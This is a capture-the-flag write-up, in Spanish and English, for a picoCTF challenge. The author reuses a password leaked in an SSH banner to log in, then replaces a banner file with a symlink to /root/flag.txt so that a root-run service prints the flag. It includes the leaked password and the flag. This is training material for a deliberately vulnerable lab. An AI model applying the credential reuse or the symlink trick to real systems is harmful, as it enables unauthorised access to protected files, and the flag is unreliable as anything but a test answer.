
Can you abuse the banner?

Additional details will be available after launching your challenge instance.


The server has been leaking some crucial information on `tethys.picoctf.net 51650`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 53198`. From the above information abuse the machine and find the flag in the /root directory.

- Do you know about symlinks?
- Maybe some small password cracking or guessing

## Solucion

```
nc tethys.picoctf.net 51650
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234


❯ nc tethys.picoctf.net 53198
*************************************
**************WELCOME****************
*************************************

what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
defcon
the first hacker ever was known for phreaking(making free phone calls), who was it?
john
player@challenge:~$



```
- listamos archivos, podemos escribir en el banner
```
player@challenge:~$ ls -la
ls -la
total 20
drwxr-xr-x 1 player player   20 Mar  9  2024 .
drwxr-xr-x 1 root   root     20 Mar  9  2024 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
-rw-r--r-- 1 player player  114 Feb  7  2024 banner
-rw-r--r-- 1 root   root     13 Feb  7  2024 text
player@challenge:~$ cat tex
cat text
keep digging
player@challenge:~$ cat banner
cat banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$
```

- borramos el banner y creamos una liga symbolica a la flag

```
player@challenge:~$ rm banner
rm banner
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
player@challenge:~$ cat banner
cat banner
cat: banner: Permission denied
player@challenge:~$ ls -la
ls -la
total 16
drwxr-xr-x 1 player player   20 Apr  3 17:42 .
drwxr-xr-x 1 root   root     20 Mar  9  2024 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
lrwxrwxrwx 1 player player   14 Apr  3 17:42 banner -> /root/flag.txt
-rw-r--r-- 1 root   root     13 Feb  7  2024 text
player@challenge:~$

```

- Nos loguemos nuevamente
```
nc tethys.picoctf.net 53198
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_a0e119d4}

what is the password?
```